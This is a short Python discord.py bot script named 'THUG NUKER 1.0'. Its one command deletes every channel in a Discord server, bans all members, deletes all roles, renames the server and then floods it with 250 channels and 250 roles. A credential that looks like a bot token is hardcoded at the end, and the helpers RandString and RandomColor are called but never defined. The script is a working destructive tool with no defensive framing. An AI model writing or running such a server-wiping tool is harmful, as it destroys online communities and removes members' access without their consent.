import discord
from discord.ext import commands

client = commands.Bot(command_prefix=":")
######################################################################################
@client.event
async def on_ready():
	print("THUG NUKER 1.0")
######################################################################################
######################################################################################
@client.command()
async def thug(ctx): 
    await ctx.message.delete()
    await ctx.send("get thugged omega lol")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="get thugged",
            description="thugged",
            reason="get thugged",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name= "thugged")
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())


client.run("ODAwNzc5MDMzODMwNDkwMTQy.YAXFlw.M8GI-VyKejYPTZGtQhQ1QZH_TFw")